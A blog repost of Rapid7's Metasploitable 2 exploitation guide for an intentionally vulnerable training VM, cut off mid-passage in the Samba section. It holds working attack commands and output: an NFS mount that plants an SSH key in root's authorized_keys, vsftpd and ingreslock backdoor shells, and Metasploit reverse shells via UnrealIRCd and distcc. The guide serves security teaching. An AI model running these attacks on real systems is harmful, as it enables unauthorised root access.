<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Metasploitable 2 Exploitability Guide | lan&#39;s spaces</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="转载防止失效 Metasploitable 2 Exploitability Guide | Metasploit Documentation">
<meta property="og:type" content="article">
<meta property="og:title" content="Metasploitable 2 Exploitability Guide">
<meta property="og:url" content="http://example.com/2024/04/Metasploitable%202%20Exploitability%20Guide/index.html">
<meta property="og:site_name" content="lan&#39;s spaces">
<meta property="og:description" content="转载防止失效 Metasploitable 2 Exploitability Guide | Metasploit Documentation">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2024/04/Metasploitable%202%20Exploitability%20Guide/04/Metasploitable%202%20Exploitability%20Guide/image-20240402111825542.png">
<meta property="og:image" content="http://example.com/2024/04/Metasploitable%202%20Exploitability%20Guide/04/Metasploitable%202%20Exploitability%20Guide/image-20240402111908345.png">
<meta property="og:image" content="http://example.com/2024/04/Metasploitable%202%20Exploitability%20Guide/04/Metasploitable%202%20Exploitability%20Guide/image-20240402111920096.png">
<meta property="og:image" content="http://example.com/2024/04/Metasploitable%202%20Exploitability%20Guide/04/Metasploitable%202%20Exploitability%20Guide/image-20240402111940017.png">
<meta property="og:image" content="http://example.com/2024/04/Metasploitable%202%20Exploitability%20Guide/04/Metasploitable%202%20Exploitability%20Guide/image-20240402111947046.png">
<meta property="article:published_time" content="2024-04-01T16:00:00.000Z">
<meta property="article:modified_time" content="2024-04-06T10:35:37.232Z">
<meta property="article:author" content="lance">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2024/04/Metasploitable%202%20Exploitability%20Guide/04/Metasploitable%202%20Exploitability%20Guide/image-20240402111825542.png">
  
    <link rel="alternate" href="/atom.xml" title="lan's spaces" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

  
<meta name="generator" content="Hexo 7.1.1"></head>

<body>
  <div class="nav-header">
  <nav class="nav-wrapper" aria-label="Main">
      
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives">Archives</a></li>
        
          <li><a href="/about">About</a></li>
        
          <li><a href="/tags">Tags</a></li>
        
          <li><a href="/categories">Categories</a></li>
        
      </ul>
      <ul class="nav-meta">
        
        <li class="nav-twitter">
          <a aria-label="Twitter" href="https://twitter.com/lancel_huang" title="Twitter" target="_blank">
            <i class="icon icon-twitter" aria-hidden="true"></i>
            <span>Twitter</span>
          </a>
        </li>
        
        
        <li class="nav-github">
          <a aria-label="GitHub" href="https://github.com/Lan-ce-lot" title="GitHub" target="_blank">
            <i class="icon icon-github" aria-hidden="true"></i>
            <span>GitHub</span>
          </a>
        </li>
        
        
        <li class="nav-search">
          <a title="Search">
            <i class="icon icon-search" aria-hidden="true"></i>
            <span>Search</span>
          </a>
        </li>
      </ul>
      
      

  </nav>

  <div class="nav-wrapper-control">
      <div class="inner">
          <a class="nav-menu" role="button"><i class="icon icon-menu" aria-hidden="true"></i>Menu</a>
          <a class="nav-search" title="Search" role="button"><i class="icon icon-search" aria-hidden="true"></i></a>
      </div>
  </div>
  
  
  
<script src="/js/jquery-3.6.4.min.js"></script>


  
<script src="/js/script.js"></script>

</div>

  <div class="nav-close" role="button" aria-label="Close"></div>
  <section class="page-wrapper">
    <div class="progress-container">
	<span class="progress-bar"></span>
</div>

<header class="post-header">
	<div class="inner">
		<span class="post-info">
      <span class="post-type">
        Article
      </span>
      
        <a class="tag-link" href="/tags/CTF/" rel="tag"><span class="post-count">CTF</span></a>
      
    </span>
    <h1 class="post-title">Metasploitable 2 Exploitability Guide</h1>
    <div class="post-meta">
      <div class="post-meta-avatars">
        <figure class="post-meta-avatar avatar">
          
        </figure>
      </div>
      <h4 class="post-meta-author">
        lance
      </h4>
      <time class="post-meta-date" datetime="2024-04-02">
        02 Apr 2024
      </time>
    </div>
  </div>
</header>

<main class="content" role="main">
  <article class="post">
    <div class="inner">
			<section class="post-content">
        <p>转载防止失效</p>
<p><a target="_blank" rel="noopener" href="https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/">Metasploitable 2 Exploitability Guide | Metasploit Documentation</a></p>
<span id="more"></span>
<p>The Metasploitable virtual machine is an intentionally vulnerable version of Ubuntu Linux designed for testing security tools and demonstrating common vulnerabilities. Version 2 of this virtual machine is <a target="_blank" rel="noopener" href="https://information.rapid7.com/metasploitable-download.html">available for download</a> and ships with even more vulnerabilities than the original image. This virtual machine is compatible with VMWare, VirtualBox, and other common virtualization platforms. By default, Metasploitable’s network interfaces are bound to the NAT and Host-only network adapters, and the image should never be exposed to a hostile network. (Note: A video tutorial on installing Metasploitable 2 is available <a target="_blank" rel="noopener" href="https://community.rapid7.com/thread/2007">here</a>.)</p>
<p>This document outlines many of the security flaws in the Metasploitable 2 image. Currently missing is documentation on the web server and web application flaws as well as vulnerabilities that allow a local user to escalate to root privileges. This document will continue to expand over time as many of the less obvious flaws with this platform are detailed.</p>
<h2 id="getting-started"><a class="markdownIt-Anchor" href="#getting-started"></a> Getting Started</h2>
<p>After the virtual machine boots, login to console with username <code>msfadmin</code> and password <code>msfadmin</code>. From the shell, run the <code>ifconfig</code> command to identify the IP address.</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msfadmin</span>@metasploitable:~$ ifconfig</span><br><span class="line"> </span><br><span class="line"><span class="attribute">eth0</span>      Link encap:Ethernet  HWaddr <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">9</span>a:<span class="number">52</span>:c1 </span><br><span class="line">          <span class="attribute">inet</span> addr:<span class="number">192.168.99.131</span>  Bcast:<span class="number">192.168.99.255</span>  Mask:<span class="number">255.255.255.0</span></span><br><span class="line">          <span class="attribute">inet6</span> addr: fe80::<span class="number">20</span>c:<span class="number">29</span>ff:fe9a:<span class="number">52</span>c1/<span class="number">64</span> Scope:Link</span><br><span class="line">          <span class="attribute">UP</span> BROADCAST RUNNING MULTICAST  MTU:<span class="number">1500</span>  Metric:<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="services"><a class="markdownIt-Anchor" href="#services"></a> Services</h2>
<p>From our attack system (Linux, preferably something like Kali Linux), we will identify the open network services on this virtual machine using the <a target="_blank" rel="noopener" href="https://nmap.org/">Nmap Security Scanner</a>. The following command line will scan all TCP ports on the Metasploitable 2 instance:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># nmap -p0-65535 192.168.99.131</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-05-31 21:14 PDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.99.131</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 65506 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">23/tcp    open  telnet</span><br><span class="line">25/tcp    open  smtp</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">512/tcp   open  <span class="built_in">exec</span></span><br><span class="line">513/tcp   open  login</span><br><span class="line">514/tcp   open  shell</span><br><span class="line">1099/tcp  open  rmiregistry</span><br><span class="line">1524/tcp  open  ingreslock</span><br><span class="line">2049/tcp  open  nfs</span><br><span class="line">2121/tcp  open  ccproxy-ftp</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">3632/tcp  open  distccd</span><br><span class="line">5432/tcp  open  postgresql</span><br><span class="line">5900/tcp  open  vnc</span><br><span class="line">6000/tcp  open  X11</span><br><span class="line">6667/tcp  open  irc</span><br><span class="line">6697/tcp  open  unknown</span><br><span class="line">8009/tcp  open  ajp13</span><br><span class="line">8180/tcp  open  unknown</span><br><span class="line">8787/tcp  open  unknown</span><br><span class="line">39292/tcp open  unknown</span><br><span class="line">43729/tcp open  unknown</span><br><span class="line">44813/tcp open  unknown</span><br><span class="line">55852/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:9A:52:C1 (VMware)</span><br></pre></td></tr></table></figure>
<p>Nearly every one of these listening services provides a remote entry point into the system. In the next section, we will walk through some of these vectors.</p>
<h2 id="unix-basics"><a class="markdownIt-Anchor" href="#unix-basics"></a> Unix Basics</h2>
<p>TCP ports 512, 513, and 514 are known as “r” services, and have been misconfigured to allow remote access from any host (a standard “.rhosts + +” situation). To take advantage of this, make sure the “rsh-client” client is installed (on Ubuntu), and run the following command as your local root user. If you are prompted for an SSH key, this means the rsh-client tools have not been installed and Ubuntu is defaulting to using SSH.</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rlogin -l root 192.168.99.131</span></span><br><span class="line"><span class="attribute">Last</span> login: Fri Jun  <span class="number">1</span> <span class="number">00</span>:<span class="number">10</span>:<span class="number">39</span> EDT <span class="number">2012</span> from :<span class="number">0</span>.<span class="number">0</span> <span class="literal">on</span> pts/<span class="number">0</span></span><br><span class="line"><span class="attribute">Linux</span> metasploitable <span class="number">2</span>.<span class="number">6</span>.<span class="number">24</span>-<span class="number">16</span>-server #<span class="number">1</span> SMP Thu Apr <span class="number">10</span> <span class="number">13</span>:<span class="number">58</span>:<span class="number">00</span> UTC <span class="number">2008</span> i686</span><br><span class="line"> </span><br><span class="line"><span class="attribute">root</span>@metasploitable:~#</span><br></pre></td></tr></table></figure>
<p>This is about as easy as it gets. The next service we should look at is the Network File System (NFS). NFS can be identified by probing port 2049 directly or asking the portmapper for a list of services. The example below using <code>rpcinfo</code> to identify NFS and <code>showmount -e</code> to determine that the “/” share (the root of the file system) is being exported. You will need the rpcbind and nfs-common Ubuntu packages to follow along.</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># rpcinfo -p 192.168.99.131</span></span><br><span class="line">   program vers proto   port  service</span><br><span class="line">   <span class="number"> 100000 </span>  <span class="number"> 2 </span>  tcp   <span class="number"> 111 </span> portmapper</span><br><span class="line">   <span class="number"> 100000 </span>  <span class="number"> 2 </span>  udp   <span class="number"> 111 </span> portmapper</span><br><span class="line">   <span class="number"> 100024 </span>  <span class="number"> 1 </span>  udp <span class="number"> 53318 </span> status</span><br><span class="line">   <span class="number"> 100024 </span>  <span class="number"> 1 </span>  tcp <span class="number"> 43729 </span> status</span><br><span class="line">   <span class="number"> 100003 </span>  <span class="number"> 2 </span>  udp  <span class="number"> 2049 </span> nfs</span><br><span class="line">   <span class="number"> 100003 </span>  <span class="number"> 3 </span>  udp  <span class="number"> 2049 </span> nfs</span><br><span class="line">   <span class="number"> 100003 </span>  <span class="number"> 4 </span>  udp  <span class="number"> 2049 </span> nfs</span><br><span class="line">   <span class="number"> 100021 </span>  <span class="number"> 1 </span>  udp <span class="number"> 46696 </span> nlockmgr</span><br><span class="line">   <span class="number"> 100021 </span>  <span class="number"> 3 </span>  udp <span class="number"> 46696 </span> nlockmgr</span><br><span class="line">   <span class="number"> 100021 </span>  <span class="number"> 4 </span>  udp <span class="number"> 46696 </span> nlockmgr</span><br><span class="line">   <span class="number"> 100003 </span>  <span class="number"> 2 </span>  tcp  <span class="number"> 2049 </span> nfs</span><br><span class="line">   <span class="number"> 100003 </span>  <span class="number"> 3 </span>  tcp  <span class="number"> 2049 </span> nfs</span><br><span class="line">   <span class="number"> 100003 </span>  <span class="number"> 4 </span>  tcp  <span class="number"> 2049 </span> nfs</span><br><span class="line">   <span class="number"> 100021 </span>  <span class="number"> 1 </span>  tcp <span class="number"> 55852 </span> nlockmgr</span><br><span class="line">   <span class="number"> 100021 </span>  <span class="number"> 3 </span>  tcp <span class="number"> 55852 </span> nlockmgr</span><br><span class="line">   <span class="number"> 100021 </span>  <span class="number"> 4 </span>  tcp <span class="number"> 55852 </span> nlockmgr</span><br><span class="line">   <span class="number"> 100005 </span>  <span class="number"> 1 </span>  udp <span class="number"> 34887 </span> mountd</span><br><span class="line">   <span class="number"> 100005 </span>  <span class="number"> 1 </span>  tcp <span class="number"> 39292 </span> mountd</span><br><span class="line">   <span class="number"> 100005 </span>  <span class="number"> 2 </span>  udp <span class="number"> 34887 </span> mountd</span><br><span class="line">   <span class="number"> 100005 </span>  <span class="number"> 2 </span>  tcp <span class="number"> 39292 </span> mountd</span><br><span class="line">   <span class="number"> 100005 </span>  <span class="number"> 3 </span>  udp <span class="number"> 34887 </span> mountd</span><br><span class="line">   <span class="number"> 100005 </span>  <span class="number"> 3 </span>  tcp <span class="number"> 39292 </span> mountd</span><br><span class="line"></span><br><span class="line">root@ubuntu:~<span class="comment"># showmount -e 192.168.99.131</span></span><br><span class="line">Export list for 192.168.99.131:</span><br><span class="line">/ *</span><br></pre></td></tr></table></figure>
<p>Getting access to a system with a writeable filesystem like this is trivial. To do so (and because SSH is running), we will generate a new SSH key on our attacking system, mount the NFS export, and add our key to the root user account’s authorized_keys file:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="comment"># ssh-keygen</span></span><br><span class="line"><span class="title class_">Generating</span> <span class="keyword">public</span>/<span class="keyword">private</span> rsa key pair.</span><br><span class="line"><span class="title class_">Enter</span> file <span class="keyword">in</span> which to save the key (<span class="regexp">/root/</span>.ssh/id_rsa):</span><br><span class="line"><span class="title class_">Enter</span> passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line"><span class="title class_">Enter</span> same passphrase <span class="symbol">again:</span></span><br><span class="line"><span class="title class_">Your</span> identification has been saved <span class="keyword">in</span> /root/.ssh/id_rsa.</span><br><span class="line"><span class="title class_">Your</span> <span class="keyword">public</span> key has been saved <span class="keyword">in</span> /root/.ssh/id_rsa.pub.</span><br><span class="line">                       </span><br><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="comment"># mkdir /tmp/r00t</span></span><br><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="comment"># mount -t nfs 192.168.99.131:/ /tmp/r00t/</span></span><br><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="comment"># cat ~/.ssh/id_rsa.pub &gt;&gt; /tmp/r00t/root/.ssh/authorized_keys</span></span><br><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="comment"># umount /tmp/r00t</span></span><br><span class="line">                       </span><br><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="comment"># ssh root@192.168.99.131</span></span><br><span class="line"><span class="title class_">Last</span> <span class="symbol">login:</span> <span class="title class_">Fri</span> <span class="title class_">Jun</span>  <span class="number">1</span> <span class="number">00</span><span class="symbol">:</span><span class="number">29</span><span class="symbol">:</span><span class="number">33</span> <span class="number">2012</span> from <span class="number">192.168</span>.<span class="number">99.128</span></span><br><span class="line"><span class="title class_">Linux</span> metasploitable <span class="number">2.6</span>.<span class="number">24</span>-<span class="number">16</span>-server <span class="comment">#1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</span></span><br><span class="line">                       </span><br><span class="line">root<span class="variable">@metasploitable</span><span class="symbol">:~</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<h2 id="backdoors"><a class="markdownIt-Anchor" href="#backdoors"></a> Backdoors</h2>
<p>On port 21, Metasploitable2 runs vsftpd, a popular FTP server. This particular version <a target="_blank" rel="noopener" href="https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html">contains a backdoor</a> that was slipped into the source code by an unknown intruder. The backdoor was quickly identified and removed, but not before quite a few people downloaded it. If a username is sent that ends in the sequence <code>:)</code> [ a happy face ], the backdoored version will open a listening shell on port 6200. We can demonstrate this with telnet or use the <a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor">Metasploit Framework module</a> to automatically exploit it:</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># telnet 192.168.99.131 21</span></span><br><span class="line">Trying <span class="number">192.168</span>.<span class="number">99.131</span>...</span><br><span class="line">Connected <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">99.131</span>.</span><br><span class="line">Escape character <span class="keyword">is</span> <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"><span class="number">220</span> (vsFTPd <span class="number">2.3</span>.<span class="number">4</span>)</span><br><span class="line">user backdoored:)</span><br><span class="line"><span class="number">331</span> Please specify the password.</span><br><span class="line">pass invalid</span><br><span class="line">^]</span><br><span class="line">telnet&gt; quit</span><br><span class="line">Connection closed.</span><br><span class="line">                       </span><br><span class="line">root@ubuntu:~<span class="comment"># telnet 192.168.99.131 6200</span></span><br><span class="line">Trying <span class="number">192.168</span>.<span class="number">99.131</span>...</span><br><span class="line">Connected <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">99.131</span>.</span><br><span class="line">Escape character <span class="keyword">is</span> <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">id;</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>
<p>On port 6667, Metasploitable2 runs the UnreaIRCD IRC daemon. This version contains a backdoor that <a target="_blank" rel="noopener" href="https://forums.unrealircd.org/viewtopic.php?t=6562">went unnoticed for months</a> - triggered by sending the letters “AB” following by a system command to the server on any listening port. Metasploit has a <a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor">module</a> to exploit this in order to gain an interactive shell, as shown below.</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"> </span><br><span class="line">msf &gt; use exploit/unix/irc/unreal_ircd_3281_backdoor</span><br><span class="line">msf  exploit(unreal_ircd_3281_backdoor) &gt; set RHOST 192.168.99.131</span><br><span class="line">msf  exploit(unreal_ircd_3281_backdoor) &gt; exploit</span><br><span class="line"> </span><br><span class="line"><span class="comment">[*]</span> Started reverse double handler</span><br><span class="line"><span class="comment">[*]</span> Connected to 192.168.99.131:6667...</span><br><span class="line">    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...</span><br><span class="line">    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn&#x27;t resolve your hostname; using your IP address instead</span><br><span class="line"><span class="comment">[*]</span> Sending backdoor command...</span><br><span class="line"><span class="comment">[*]</span> Accepted the first client connection...</span><br><span class="line"><span class="comment">[*]</span> Accepted the second client connection...</span><br><span class="line"><span class="comment">[*]</span> Command: echo 8bMUYsfmGvOLHBxe;</span><br><span class="line"><span class="comment">[*]</span> Writing to socket A</span><br><span class="line"><span class="comment">[*]</span> Writing to socket B</span><br><span class="line"><span class="comment">[*]</span> Reading from sockets...</span><br><span class="line"><span class="comment">[*]</span> Reading from socket B</span><br><span class="line"><span class="comment">[*]</span> B: <span class="string">&quot;8bMUYsfmGvOLHBxe\r\n&quot;</span></span><br><span class="line"><span class="comment">[*]</span> Matching...</span><br><span class="line"><span class="comment">[*]</span> A <span class="keyword">is</span> input...</span><br><span class="line"><span class="comment">[*]</span> Command shell session 1 opened (192.168.99.128:4444 -&gt; 192.168.99.131:60257) at 2012-05-31 21:53:59 -0700</span><br><span class="line"></span><br><span class="line">                       </span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>
<p>Much less subtle is the old standby “ingreslock” backdoor that is listening on port 1524. The ingreslock port was a popular choice a decade ago for adding a backdoor to a compromised server. Accessing it is easy:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# telnet 192.168.99.131 1524</span><br><span class="line">Trying 192.168.99.131<span class="built_in">..</span>.</span><br><span class="line">Connected <span class="keyword">to</span> 192.168.99.131.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">root@metasploitable:/# id</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br></pre></td></tr></table></figure>
<h2 id="unintentional-backdoors"><a class="markdownIt-Anchor" href="#unintentional-backdoors"></a> Unintentional Backdoors</h2>
<p>In addition to the malicious backdoors in the previous section, some services are almost backdoors by their very nature. The first of which installed on Metasploitable2 is distccd. This program makes it easy to scale large compiler jobs across a farm of like-configured systems. The problem with this service is that an attacker can easily abuse it to run a command of their choice, as demonstrated by the <a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec">Metasploit module</a> usage below.</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"> </span><br><span class="line">msf &gt; use exploit/unix/misc/distcc_exec</span><br><span class="line">msf  exploit(distcc_exec) &gt; set RHOST <span class="number">192.168</span>.<span class="number">99.131</span></span><br><span class="line">msf  exploit(distcc_exec) &gt; exploit</span><br><span class="line">                       </span><br><span class="line"><span class="selector-attr">[*]</span> Started reverse double handler</span><br><span class="line"><span class="selector-attr">[*]</span> Accepted the first client connection...</span><br><span class="line"><span class="selector-attr">[*]</span> Accepted the second client connection...</span><br><span class="line"><span class="selector-attr">[*]</span> Command: echo uk3UdiwLUq0LX3Bi;</span><br><span class="line"><span class="selector-attr">[*]</span> Writing <span class="selector-tag">to</span> socket <span class="selector-tag">A</span></span><br><span class="line"><span class="selector-attr">[*]</span> Writing <span class="selector-tag">to</span> socket <span class="selector-tag">B</span></span><br><span class="line"><span class="selector-attr">[*]</span> Reading <span class="selector-tag">from</span> sockets...</span><br><span class="line"><span class="selector-attr">[*]</span> Reading <span class="selector-tag">from</span> socket <span class="selector-tag">B</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">B</span>: <span class="string">&quot;uk3UdiwLUq0LX3Bi\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] A is input...</span><br><span class="line">[*] Command shell session <span class="number">1</span> opened (<span class="number">192.168</span>.<span class="number">99.128</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span>.<span class="number">99.131</span>:<span class="number">38897</span>) at <span class="number">2012</span>-<span class="number">05</span>-<span class="number">31</span> <span class="number">22</span>:<span class="number">06</span>:<span class="number">03</span> -<span class="number">0700</span></span><br><span class="line">                       </span><br><span class="line">id</span><br><span class="line">uid=<span class="number">1</span>(daemon) gid=<span class="number">1</span>(daemon) groups=<span class="number">1</span>(daemon)</span><br></pre></td></tr></table></figure>
<p>Samba, when configured with a writeable file share and “<a target="_blank" rel="noopener" href="https://www.samba.org/samba/news/symlink_attack.html">wide links</a>” enabled (default is on), can also be used as a backdoor of sorts to access files that were not meant to be shared. The example below uses a <a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal">Metasploit module</a> to provide access to the root filesystem using an anonymous connection and a writeable share.</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="comment"># smbclient -L //192.168.99.131</span></span><br><span class="line"><span class="title class_">Anonymous</span> login successful</span><br><span class="line"><span class="title class_">Domain</span>=[<span class="title class_">WORKGROUP</span>] <span class="title class_">OS</span>=[<span class="title class_">Unix</span>] <span class="title class_">Server</span>=[<span class="title class_">Samba</span> <span class="number">3.0</span>.<span class="number">20</span>-<span class="title class_">Debian</span>]</span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Sharename</span>       <span class="title class_">Type</span>      <span class="title class_">Comment</span></span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print<span class="variable">$ </span>         <span class="title class_">Disk</span>      <span class="title class_">Printer</span> <span class="title class_">Drivers</span></span><br><span class="line">        tmp             <span class="title class_">Disk</span>      oh noes!</span><br><span class="line">        opt             <span class="title class_">Disk</span>     </span><br><span class="line">        <span class="title class_">IPC</span><span class="variable">$ </span>           <span class="title class_">IPC</span>       <span class="title class_">IPC</span> <span class="title class_">Service</span> (metasploitable server (<span class="title class_">Samba</span> <span class="number">3.0</span>.<span class="number">20</span>-<span class="title class_">Debian</span>))</span><br><span class="line">        <span class="title class_">ADMIN</span><span class="variable">$ </span>         <span class="title class_">IPC</span>       <span class="title class_">IPC</span> <span class="title class_">Service</span> (metasploitable server (<span class="title class_">Samba</span> <span class="number">3.0</span>.<span class="number">20</span>-<span class="title class_">Debian</span>))</span><br><span class="line">                       </span><br><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="comment"># msfconsole</span></span><br><span class="line">msf &gt; <span class="keyword">use</span> 